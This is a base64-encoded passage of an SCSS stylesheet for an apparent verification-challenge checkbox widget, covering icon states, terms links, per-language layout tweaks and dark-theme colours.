XplLWNvbXBhY3Qge1xuICAgICAgICAjYnJhbmRpbmcge1xuICAgICAgICAgICAgcGFkZGluZy1yaWdodDogMDtcbiAgICAgICAgICAgIHBhZGRpbmctbGVmdDogMDtcbiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICAgICAgfVxuXG4gICAgICAgICN0ZXJtcyB7XG4gICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7XG4gICAgICAgIH1cblxuICAgICAgICAjY2Ytc3RhZ2Uge1xuICAgICAgICAgICAgcGFkZGluZy1yaWdodDogNDhweDtcbiAgICAgICAgfVxuXG4gICAgICAgICNzdWNjZXNzLWljb24ge1xuICAgICAgICAgICAgbGVmdDogODZweDtcbiAgICAgICAgfVxuXG4gICAgICAgICNmYWlsLWljb24ge1xuICAgICAgICAgICAgbGVmdDogODZweDtcbiAgICAgICAgfVxuXG4gICAgICAgICNzcGlubmVyLWljb24ge1xuICAgICAgICAgICAgbGVmdDogODZweDtcbiAgICAgICAgfVxuXG4gICAgICAgICN0aW1lb3V0LWljb24sXG4gICAgICAgICNleHBpcmVkLWljb24ge1xuICAgICAgICAgICAgbGVmdDogODZweDtcbiAgICAgICAgfVxuXG4gICAgICAgICNleHBpcmVkLFxuICAgICAgICAjdGltZW91dCB7XG4gICAgICAgICAgICBtYXJnaW4tdG9wOiAwO1xuICAgICAgICAgICAgbWFyZ2luLWxlZnQ6IDA7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICAuY2ItbGIge1xuICAgICAgICBwYWRkaW5nLXJpZ2h0OiAzN3B4O1xuICAgICAgICBwYWRkaW5nLWxlZnQ6IDA7XG4gICAgICAgIHRleHQtYWxpZ246IHJpZ2h0O1xuXG4gICAgICAgIGlucHV0IHtcbiAgICAgICAgICAgIHJpZ2h0OiAxOHB4O1xuXG4gICAgICAgICAgICAmOmNoZWNrZWQge1xuICAgICAgICAgICAgICAgIH4ge1xuICAgICAgICAgICAgICAgICAgICAuY2ItaSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAmOjphZnRlciB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmlnaHQ6IDhweDtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuXG4gICAgICAgIC5jYi1pIHtcbiAgICAgICAgICAgIHJpZ2h0OiAxOHB4O1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgLmNiLWMge1xuICAgICAgICBtYXJnaW4tcmlnaHQ6IDExcHg7XG4gICAgICAgIG1hcmdpbi1sZWZ0OiAwO1xuICAgICAgICB0ZXh0LWFsaWduOiByaWdodDtcbiAgICB9XG5cbiAgICAuY2ItY29udGFpbmVyIHtcbiAgICAgICAgbWFyZ2luLWxlZnQ6IDA7XG4gICAgfVxufVxuXG4jdGVybXMge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAganVzdGlmeS1jb250ZW50OiBzcGFjZS1ldmVubHk7XG4gICAgbGluZS1oZWlnaHQ6IDEwcHg7XG4gICAgY29sb3I6ICRjb2xvci0xO1xuICAgIGZvbnQtc2l6ZTogOHB4O1xuICAgIGZvbnQtc3R5bGU6IG5vcm1hbDtcblxuICAgIGEge1xuICAgICAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTtcbiAgICAgICAgbGluZS1oZWlnaHQ6IDEwcHg7XG4gICAgICAgIGNvbG9yOiAkY29sb3ItMTtcbiAgICAgICAgZm9udC1zaXplOiA4cHg7XG4gICAgICAgIGZvbnQtd2VpZ2h0OiA0MDA7XG4gICAgICAgIGZvbnQtc3R5bGU6IG5vcm1hbDtcblxuICAgICAgICAmOmxpbmssXG4gICAgICAgICY6dmlzaXRlZCB7XG4gICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTtcbiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxMHB4O1xuICAgICAgICAgICAgY29sb3I6ICRjb2xvci0xO1xuICAgICAgICAgICAgZm9udC1zaXplOiA4cHg7XG4gICAgICAgICAgICBmb250LXdlaWdodDogNDAwO1xuICAgICAgICAgICAgZm9udC1zdHlsZTogbm9ybWFsO1xuICAgICAgICB9XG5cbiAgICAgICAgJjpob3ZlcixcbiAgICAgICAgJjpmb2N1cyxcbiAgICAgICAgJjphY3RpdmUge1xuICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7XG4gICAgICAgICAgICBjb2xvcjogJGNvbG9yLTQ7XG4gICAgICAgIH1cbiAgICB9XG59XG5cbiNjaGFsbGVuZ2UtZXJyb3ItdGl0bGUge1xuICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgICB0b3A6IDA7XG4gICAgbWFyZ2luOiA1cHggMDtcbiAgICB3aWR0aDogMjAwcHg7XG4gICAgaGVpZ2h0OiA1NXB4O1xuICAgIGNvbG9yOiAkY29sb3ItMjtcbiAgICBmb250LXNpemU6IDExcHg7XG5cbiAgICBhIHtcbiAgICAgICAgY29sb3I6ICRjb2xvci0xO1xuXG4gICAgICAgICY6aG92ZXIsXG4gICAgICAgICY6Zm9jdXMsXG4gICAgICAgICY6YWN0aXZlIHtcbiAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lO1xuICAgICAgICAgICAgY29sb3I6ICRjb2xvci00O1xuICAgICAgICB9XG5cbiAgICAgICAgJjpsaW5rLFxuICAgICAgICAmOnZpc2l0ZWQge1xuICAgICAgICAgICAgY29sb3I6ICRjb2xvci0xO1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgLmljb24td3JhcHBlciB7XG4gICAgICAgIGRpc3BsYXk6IG5vbmU7XG4gICAgfVxufVxuXG4udW5zcHVuIHtcbiAgICAuY2lyY2xlIHtcbiAgICAgICAgYW5pbWF0aW9uOiB1bnNwaW4gMC43cyBjdWJpYy1iZXppZXIoMC42NSwgMCwgMC40NSwgMSkgZm9yd2FyZHM7XG4gICAgfVxufVxuXG4uY2lyY2xlIHtcbiAgICBzdHJva2Utd2lkdGg6IDNweDtcbiAgICBzdHJva2UtbGluZWNhcDogcm91bmQ7XG4gICAgc3Ryb2tlOiAkc3VjY2Vzcy1jb2xvci0yO1xuICAgIHN0cm9rZS1kYXNoYXJyYXk6IDAsIDEwMCwgMDtcbiAgICBzdHJva2UtZGFzaG9mZnNldDogMjAwO1xuICAgIHN0cm9rZS1taXRlcmxpbWl0OiAxO1xuICAgIHN0cm9rZS1saW5lam9pbjogcm91bmQ7XG59XG5cbi5tYWluLXdyYXBwZXIge1xuICAgIGJvcmRlci1zcGFjaW5nOiAwO1xufVxuXG4ucDEge1xuICAgIGZpbGw6IG5vbmU7XG4gICAgc3Ryb2tlOiAjZmZmO1xufVxuXG4udGltZW91dC1wMSxcbi5leHBpcmVkLXAxIHtcbiAgICBmaWxsOiBub25lO1xuICAgIHN0cm9rZTogI2ZmZjtcbn1cblxuLm9mZmxhYmVsIHtcbiAgICAuY2lyY2xlIHtcbiAgICAgICAgc3Ryb2tlOiAkY29sb3ItMTtcbiAgICB9XG5cbiAgICAuc3VjY2Vzcy1jaXJjbGUge1xuICAgICAgICBzdHJva2U6ICRjb2xvci0xO1xuICAgICAgICBmaWxsOiAkY29sb3ItMTtcbiAgICB9XG5cbiAgICAuZmFpbHVyZS1jaXJjbGUge1xuICAgICAgICBzdHJva2U6ICRjb2xvci0xO1xuICAgIH1cblxuICAgICNmYWlsLWljb24ge1xuICAgICAgICBib3gtc2hhZG93OiBpbnNldCAwIDAgMCAkY29sb3ItMTtcbiAgICAgICAgYW5pbWF0aW9uOlxuICAgICAgICAgICAgZmlsbGZhaWwtb2ZmbGFiZWwgMC40cyBlYXNlLWluLW91dCAwLjRzIGZvcndhcmRzLFxuICAgICAgICAgICAgc2NhbGUgMC4zcyBlYXNlLWluLW91dCAwLjlzIGJvdGg7XG4gICAgfVxufVxuXG4udGhlbWUtZGFyay5vZmZsYWJlbCB7XG4gICAgLmNpcmNsZSB7XG4gICAgICAgIHN0cm9rZTogI2ZmZjtcbiAgICB9XG5cbiAgICAuc3VjY2Vzcy1jaXJjbGUge1xuICAgICAgICBzdHJva2U6ICNmZmY7XG4gICAgICAgIGZpbGw6ICNmZmY7XG4gICAgfVxuXG4gICAgLnAxIHtcbiAgICAgICAgc3Ryb2tlOiAjMDAwO1xuICAgIH1cblxuICAgIC50aW1lb3V0LXAxLFxuICAgIC5leHBpcmVkLXAxIHtcbiAgICAgICAgc3Ryb2tlOiAjMDAwO1xuICAgIH1cblxuICAgIC5mYWlsdXJlLWNpcmNsZSB7XG4gICAgICAgIHN0cm9rZTogI2ZmZjtcbiAgICB9XG5cbiAgICAuZXhwaXJlZC1jaXJjbGUsXG4gICAgLnRpbWVvdXQtY2lyY2xlIHtcbiAgICAgICAgZmlsbDogI2ZmZjtcbiAgICAgICAgc3Ryb2tlOiAjZmZmO1xuICAgIH1cbn1cblxuLmV4cGlyZWQtY2lyY2xlLFxuLnRpbWVvdXQtY2lyY2xlIHtcbiAgICBzdHJva2Utd2lkdGg6IDNweDtcbiAgICBzdHJva2UtbGluZWNhcDogcm91bmQ7XG4gICAgc3Ryb2tlOiAkYmFja2dyb3VuZC1jb2xvci01O1xuICAgIGZpbGw6ICRiYWNrZ3JvdW5kLWNvbG9yLTU7XG4gICAgc3Ryb2tlLWxpbmVqb2luOiByb3VuZDtcbn1cblxuI2V4cGlyZWQtaWNvbixcbiN0aW1lb3V0LWljb24ge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgbWFyZ2luLXJpZ2h0OiA4cHg7XG4gICAgYm94LXNoYWRvdzogaW5zZXQgMCAwIDAgJGJhY2tncm91bmQtY29sb3ItNTtcbiAgICB3aWR0aDogMzBweDtcbiAgICBoZWlnaHQ6IDMwcHg7XG4gICAgYW5pbWF0aW9uOiBzY2FsZSAwLjNzIGVhc2UtaW4tb3V0IDAuOXMgYm90aDtcbiAgICBzdHJva2Utd2lkdGg6IDZweDtcbiAgICBzdHJva2U6ICNmOGY4Zjg7XG4gICAgc3Ryb2tlLW1pdGVybGltaXQ6IDEwO1xufVxuXG4uY2ItY29udGFpbmVyIHtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XG4gICAgbWFyZ2luLWxlZnQ6IDExcHg7XG59XG5cbi5sb2dvLXRleHQge1xuICAgIGZpbGw6ICMwMDA7XG59XG5cbiNxciB7XG4gICAgZmlsbDogJGNvbG9yLTE7XG5cbiAgICBzdmcge1xuICAgICAgICB3aWR0aDogNDBweDtcbiAgICAgICAgaGVpZ2h0OiA0MHB4O1xuICAgIH1cbn1cblxuYm9keS50aGVtZS1kYXJrIHtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAkYmFja2dyb3VuZC1jb2xvci0zO1xuICAgIGNvbG9yOiAkY29sb3ItNTtcbn1cblxuI2ZyLWhlbHBlci1saW5rLFxuI2ZyLWhlbHBlci1sb29wLWxpbmsge1xuICAgIGRpc3BsYXk6IGJsb2NrO1xuICAgIGNvbG9yOiAkY29sb3ItMTtcblxuICAgICY6bGluayxcbiAgICAmOnZpc2l0ZWQge1xuICAgICAgICBkaXNwbGF5OiBibG9jaztcbiAgICAgICAgY29sb3I6ICRjb2xvci0xO1xuICAgIH1cblxuICAgICY6YWN0aXZlLFxuICAgICY6aG92ZXIsXG4gICAgJjpmb2N1cyB7XG4gICAgICAgIGNvbG9yOiAkY29sb3ItNDtcbiAgICB9XG59XG5cbiNleHBpcmVkLXJlZnJlc2gtbGluayxcbiN0aW1lb3V0LXJlZnJlc2gtbGluayB7XG4gICAgZGlzcGxheTogYmxvY2s7XG4gICAgY29sb3I6ICRjb2xvci0xO1xuXG4gICAgJjpsaW5rLFxuICAgICY6dmlzaXRlZCB7XG4gICAgICAgIGRpc3BsYXk6IGJsb2NrO1xuICAgICAgICBjb2xvcjogJGNvbG9yLTE7XG4gICAgfVxuXG4gICAgJjphY3RpdmUsXG4gICAgJjpob3ZlcixcbiAgICAmOmZvY3VzIHtcbiAgICAgICAgY29sb3I6ICRjb2xvci00O1xuICAgIH1cbn1cblxuaHRtbC5ydGwge1xuICAgIGRpcmVjdGlvbjogcnRsO1xufVxuXG4ubGFuZy1lcy1lcyB7XG4gICAgLmNiLWxiLXQge1xuICAgICAgICB3aWR0aDogMTE1cHg7XG4gICAgfVxuXG4gICAgI2ZhaWx1cmUtbXNnIHtcbiAgICAgICAgd2lkdGg6IDE1M3B4O1xuICAgIH1cblxuICAgICNmci1oZWxwZXIge1xuICAgICAgICBmb250LXNpemU6IDEycHg7XG4gICAgfVxuXG4gICAgLnNpemUtY29tcGFjdCB7XG4gICAgICAgIC5jYi1sYi10IHtcbiAgICAgICAgICAgIHdpZHRoOiA3NHB4O1xuICAgICAgICB9XG5cbiAgICAgICAgI2ZhaWx1cmUtbXNnIHtcbiAgICAgICAgICAgIHdpZHRoOiA4NXB4O1xuICAgICAgICB9XG4gICAgfVxufVxuXG4ubGFuZy1kYS1kayB7XG4gICAgLmNiLWxiLXQge1xuICAgICAgICB3aWR0aDogMTAwcHg7XG4gICAgfVxuXG4gICAgLnNpemUtY29tcGFjdCB7XG4gICAgICAgIC5jYi1sYi10IHtcbiAgICAgICAgICAgIHBhZGRpbmctcmlnaHQ6IDMwcHg7XG4gICAgICAgICAgICB3aWR0aDogNjVweDtcbiAgICAgICAgfVxuICAgIH1cbn1cblxuLmxhbmctZGUtZGUsXG4ubGFuZy12aS12bixcbi5sYW5nLWJnLWJnLFxuLmxhbmctZWwtZ3IsXG4ubGFuZy1zdi1zZSB7XG4gICAgI2JyYW5kaW5nIHtcbiAgICAgICAgZGlzcGxheTogZmxleDtcbiAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbiAgICAgICAgbWFyZ2luOiAwIDE2cHggMCAwO1xuICAgICAgICBwYWRkaW5nLXRvcDogNXB4O1xuICAgICAgICB0ZXh0LWFsaWduOiByaWdodDtcbiAgICB9XG5cbiAgICAuc2l6ZS1jb21wYWN0IHtcbiAgICAgICAgI2JyYW5kaW5nIHtcbiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgICAgICAgICBmbGV4LWZsb3c6IGNvbHVtbiBub3dyYXA7XG4gICAgICAgICAgICBwbGFjZS1jb250ZW50OiBmbGV4LWVuZCBmbGV4LXN0YXJ0O1xuICAgICAgICAgICAgYWxpZ24taXRlbXM6IGZsZXgtZW5kO1xuICAgICAgICAgICAgbWFyZ2luOiAwO1xuICAgICAgICAgICAgbWFyZ2luLXRvcDogNnB4O1xuICAgICAgICAgICAgbWFyZ2luLWxlZnQ6IDE2cHg7XG4gICAgICAgICAgICB0ZXh0LWFsaWduOiByaWdodDtcbiAgICAgICAgfVxuXG4gICAgICAgIC5jYi1sYi10IHtcbiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTBweDtcbiAgICAgICAgfVxuXG4gICAgICAgICNjaGFsbGVuZ2Utb3ZlcmxheSxcbiAgICAgICAgI2NoYWxsZW5nZS1lcnJvci10ZXh0IHtcbiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxMHB4O1xuICAgICAgICAgICAgZm9udC1zaXplOiA5cHg7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICAjdGVybXMge1xuICAgICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgICBmbGV4LWZsb3c6IGNvbHVtbiBub3dyYXA7XG4gICAgICAgIGp1c3RpZnktY29udGVudDogZmxleC1lbmQ7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAxMHB4O1xuICAgICAgICBmb250LXN0eWxlOiBub3JtYWw7XG5cbiAgICAgICAgLmxpbmstc3BhY2VyIHtcbiAgICAgICAgICAgIGRpc3BsYXk6IG5vbmU7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICAjY2hhbGxlbmdlLWVycm9yIHtcbiAgICAgICAgbWFyZ2luOiA4cHggNHB4O1xuICAgIH1cbn1cblxuLmxhbmctamEtanAge1xuICAgICNicmFuZGluZyB7XG4gICAgICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gICAgICAgIG1hcmdpbjogMCAxNnB4IDAgMDtcbiAgICAgICAgcGFkZGluZy10b3A6IDVweDtcbiAgICAgICAgdGV4dC1hbGlnbjogcmlnaHQ7XG4gICAgfVxuXG4gICAgI3Rlcm1zIHtcbiAgICAgICAgZGlzcGxheTogZmxleDtcbiAgICAgICAgZmxleC1mbG93OiBjb2x1bW4gbm93cmFwO1xuICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGZsZXgtZW5kO1xuICAgICAgICBsaW5lLWhlaWdodDogMTBweDtcbiAgICAgICAgZm9udC1zdHlsZTogbm9ybWFsO1xuXG4gICAgICAgIC5saW5rLXNwYWNlciB7XG4gICAgICAgICAgICBkaXNwbGF5OiBub25lO1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgLmNiLWxiLXQge1xuICAgICAgICBmb250LXNpemU6IDExcHg7XG4gICAgfVxuXG4gICAgLnNpemUtY29tcGFjdCB7XG4gICAgICAgICNjaGFsbGVuZ2Utb3ZlcmxheSxcbiAgICAgICAgI2NoYWxsZW5nZS1lcnJvci10ZXh0IHtcbiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxMHB4O1xuICAgICAgICB9XG4gICAgfVxufVxuXG4ubGFuZy1ydS1ydSB7XG4gICAgI2JyYW5kaW5nIHtcbiAgICAgICAgZGlzcGxheTogZmxleDtcbiAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbiAgICAgICAgbWFyZ2luOiAwIDE2cHggMCAwO1xuICAgICAgICBwYWRkaW5nLXRvcDogNXB4O1xuICAgICAgICB0ZXh0LWFsaWduOiByaWdodDtcbiAgICB9XG5cbiAgICAuc2l6ZS1jb21wYWN0IHtcbiAgICAgICAgI2JyYW5kaW5nIHtcbiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgICAgICAgICBmbGV4LWZsb3c6IGNvbHVtbiBub3dyYXA7XG4gICAgICAgICAgICBwbGFjZS1jb250ZW50OiBmbGV4LWVuZCBmbGV4LXN0YXJ0O1xuICAgICAgICAgICAgYWxpZ24taXRlbXM6IGZsZXgtZW5kO1xuICAgICAgICAgICAgbWFyZ2luOiAwO1xuICAgICAgICAgICAgbWFyZ2luLXRvcDogNnB4O1xuICAgICAgICAgICAgbWFyZ2luLWxlZnQ6IDE2cHg7XG4gICAgICAgICAgICB0ZXh0LWFsaWduOiByaWdodDtcbiAgICAgICAgfVxuXG4gICAgICAgICN2ZXJpZnlpbmctdGV4dCB7XG4gICAgICAgICAgICBmb250LXNpemU6IDEwcHg7XG4gICAgICAgIH1cblxuICAgICAgICAuY2ItbGItdCB7XG4gICAgICAgICAgICBtYXJnaW4tbGVmdDogNnB4O1xuICAgICAgICAgICAgZm9udC1zaXplOiAxMHB4O1xuICAgICAgICB9XG5cbiAgICAgICAgLmNiLWxiIHtcbiAgICAgICAgICAgIC5jYi1pIHtcbiAgICAgICAgICAgICAgICBsZWZ0OiAxMXB4O1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICBpbnB1dCB7XG4gICAgICAgICAgICAgICAgbGVmdDogMTFweDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuXG4gICAgICAgICNjaGFsbGVuZ2Utb3ZlcmxheSxcbiAgICAgICAgI2NoYWxsZW5nZS1lcnJvci10ZXh0IHtcbiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxMHB4O1xuICAgICAgICAgICAgZm9udC1zaXplOiA4cHg7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICAjdGVybXMge1xuICAgICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgICBmbGV4LWZsb3c6IGNvbHVtbiBub3dyYXA7XG4gICAgICAgIGp1c3RpZnktY29udGVudDogZmxleC1lbmQ7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAxMHB4O1xuICAgICAgICBmb250LXN0eWxlOiBub3JtYWw7XG5cbiAgICAgICAgLmxpbmstc3BhY2VyIHtcbiAgICAgICAgICAgIGRpc3BsYXk6IG5vbmU7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICAjY2hhbGxlbmdlLWVycm9yIHtcbiAgICAgICAgbWFyZ2luOiA4cHggNHB4O1xuICAgIH1cbn1cblxuLm92ZXJsYXkge1xuICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgICB0b3A6IDVweDtcbiAgICBsZWZ0OiA1cHg7XG4gICAgb3BhY2l0eTogMC45O1xuICAgIHotaW5kZXg6IDIxNDc0ODM2NDc7XG4gICAgYm9yZGVyOiAxcHggc29saWQgJGNvbG9yLTI7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogJGJhY2tncm91bmQtY29sb3ItNDtcbiAgICBwYWRkaW5nOiAycHg7XG4gICAgaGVpZ2h0OiBhdXRvO1xuICAgIGxpbmUtaGVpZ2h0OiA4cHg7XG4gICAgY29sb3I6ICRjb2xvci0yO1xuICAgIGZvbnQtZmFtaWx5OiAkZm9udC1mYW1pbHktbW9ubztcbiAgICBmb250LXNpemU6IDhweDtcbn1cblxuLmxhbmctaXQtaXQge1xuICAgIC5zaXplLWNvbXBhY3Qge1xuICAgICAgICAjY2hhbGxlbmdlLW92ZXJsYXksXG4gICAgICAgICNjaGFsbGVuZ2UtZXJyb3ItdGV4dCB7XG4gICAgICAgICAgICBsaW5lLWhlaWdodDogMTBweDtcbiAgICAgICAgICAgIGZvbnQtc2l6ZTogOXB4O1xuICAgICAgICB9XG4gICAgfVxufVxuXG4ubGFuZy1pZC1pZCB7XG4gICAgLnNpemUtY29tcGFjdCB7XG4gICAgICAgICNjaGFsbGVuZ2Utb3ZlcmxheSxcbiAgICAgICAgI2NoYWxsZW5nZS1lcnJvci10ZXh0IHtcbiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxMHB4O1xuICAgICAgICB9XG4gICAgfVxufVxuXG5AbWVkaWEgKHByZWZlcnMtY29sb3Itc2NoZW1lOiBkYXJrKSB7XG4gICAgYm9keS50aGVtZS1hdXRvIHtcbiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogJGJhY2tncm91bmQtY29sb3ItMztcbiAgICAgICAgY29sb3I6ICRjb2xvci01O1xuICAgIH1cblxuICAgIC50aGVtZS1hdXRvIHtcbiAgICAgICAgaDEge1xuICAgICAgICAgICAgY29sb3I6ICRjb2xvci01O1xuICAgICAgICB9XG5cbiAgICAgICAgI2NoYWxsZW5nZS1lcnJvci10aXRsZSB7XG4gICAgICAgICAgICBjb2xvcjogJGNvbG9yLTM7XG5cbiAgICAgICAgICAgIGEge1xuICAgICAgICAgICAgICAgIGNvbG9yOiAkY29sb3ItNjtcblxuICAgICAgICAgICAgICAgICY6dmlzaXRlZCxcbiAgICAgICAgICAgICAgICAmOmxpbmsge1xuICAgICAgICAgICAgICAgICAgICBjb2xvcjogJGNvbG9yLTY7XG4gICAgICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAgICAgJjpob3ZlcixcbiAgICAgICAgICAgICAgICAmOmZvY3VzLFxuICAgICAgICAgICAgICAgICY6YWN0aXZlIHtcbiAgICAgICAgICAgICAgICAgICAgY29sb3I6ICRjb2xvci03O1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuXG4gICAgICAgICNjaGFsbGVuZ2Utb3ZlcmxheSB7XG4gICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAkYmFja2dyb3VuZC1jb2xvci0zO1xuICAgICAgICB9XG5cbiAgICAgICAgI2NoYWxsZW5nZS1vdmVybGF5LFxuICAgICAgICAjY2hhbGxlbmdlLWVycm9yLXRleHQge1xuICAgICAgICAgICAgY29sb3I6ICRjb2xvci0zO1xuXG4gICAgICAgICAgICBhIHtcbiAgICAgICAgICAgICAgICBjb2xvcjogJGNvbG9yLTY7XG5cbiAgICAgICAgICAgICAgICAmOnZpc2l0ZWQsXG4gICAgICAgICAgICAgICAgJjpsaW5rIHtcbiAgICAgICAgICAgICAgICAgICAgY29sb3I6ICRjb2xvci02O1xuICAgICAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgICAgICY6aG92ZXIsXG4gICAgICAgICAgICAgICAgJjpmb2N1cyxcbiAgICAgICAgICAgICAgICAmOmFjdGl2ZSB7XG4gICAgICAgICAgICAgICAgICAgIGNvbG9yOiAkY29sb3ItNztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cblxuICAgICAgICAjdGVybXMge1xuICAgICAgICAgICAgY29sb3I6ICRjb2xvci02O1xuXG4gICAgICAgICAgICBhIHtcbiAgICAgICAgICAgICAgICBjb2xvcjogJGNvbG9yLTY7XG5cbiAgICAgICAgICAgICAgICAmOnZpc2l0ZWQsXG4gICAgICAgICAgICAgICAgJjpsaW5rIHtcbiAgICAgICAgICAgICAgICAgICAgY29sb3I6ICRjb2xvci02O1xuICAgICAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgICAgICY6aG92ZXIsXG4gICAgICAgICAgICAgICAgJjpmb2N1cyxcbiAgICAgICAgICAgICAgICAmOmFjdGl2ZSB7XG4gICAgICAgICAgICAgICAgICAgIGNvbG9yOiAkY29sb3ItNztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cblxuICAgICAgICAjdGVtcnMge1xuICAgICAgICAgICAgYSB7XG4gICAgICAgICAgICAgICAgJjphY3RpdmUge1xuICAgICAgICAgICAgICAgICAgICBjb2xvcjogJGNvbG9yLTc7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9XG5cbiAgICAgICAgI2NvbnRlbnQge1xuICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiAkYm9yZGVyLWNvbG9yLTI7XG4gICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAkYmFja2dyb3VuZC1jb2xvci0zO1xuICAgICAgICB9XG5cbiAgICAgICAgI3FyIHtcbiAgICAgICAgICAgIGZpbGw6IHJnYigyNDMgMTI4IDMyKTtcbiAgICAgICAgfVxuXG4gICAgICAgIC5sb2dvLXRleHQge1xuICAgICAgICAgICAgZmlsbDogI2ZmZjtcbiAgICAgICAgfVxuXG4gICAgICAgIC5jYi1sYiB7XG4gICAgICAgICAgICBpbnB1dCB7XG4gICAgICAgICAgICAgICAgJjpjaGVja2VkIHtcbiAgICAgICAgICAgICAgICAgICAgfiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAuY2ItaSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogJGJhY2tncm91bmQtY29sb3ItNTtcblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICY6OmFmdGVyIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiAkYm9yZGVyLWNvbG9yLTE7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAgICAgJjphY3RpdmUge1xuICAgICAgICAgICAgICAgICAgICB+IHtcbiAgICAgICAgICAgICAgICAgICAgICAgIC5jYi1pIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBib3JkZXI6IDJweCBzb2xpZCAkY2hlY2tib3gtY29sb3ItMTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgICAgICY6Zm9jdXMge1xuICAgICAgICAgICAgICAgICAgICB+IHtcbiAgICAgICAgICAgICAgICAgICAgICAgIC5jYi1pIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBib3JkZXI6IDJweCBzb2xpZCAkY2hlY2tib3gtY29sb3ItMTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgLmNiLWkge1xuICAgICAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICRkYXJrLW1hcmstY29sb3ItMTtcbiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAkYmFja2dyb3VuZC1jb2xvci0zO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG5cbiAgICAgICAgI3N1Y2Nlc3MtaWNvbiB7XG4gICAgICAgICAgICBib3gtc2hhZG93OiBpbnNldCAwIDAgMCAkc3VjY2Vzcy1jb2xvci0xO1xuXG4gICAgICAgICAgICAucDEge1xuICAgICAgICAgICAgICAgIGJveC1zaGFkb3c6IGluc2V0IDAgMCAwICRzdWNjZXNzLWNvbG9yLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cblxuICAgICAgICAuc3VjY2Vzcy1jaXJjbGUge1xuICAgICAgICAgICAgc3Ryb2tlOiAkc3VjY2Vzcy1jb2xvci0xO1xuICAgICAgICAgICAgZmlsbDogJHN1Y2Nlc3MtY29sb3ItMTtcbiAgICAgICAgfVxuXG4gICAgICAgICNmci1oZWxwZXItbGluayxcbiAgICAgICAgI2ZyLWhlbHBlci1sb29wLW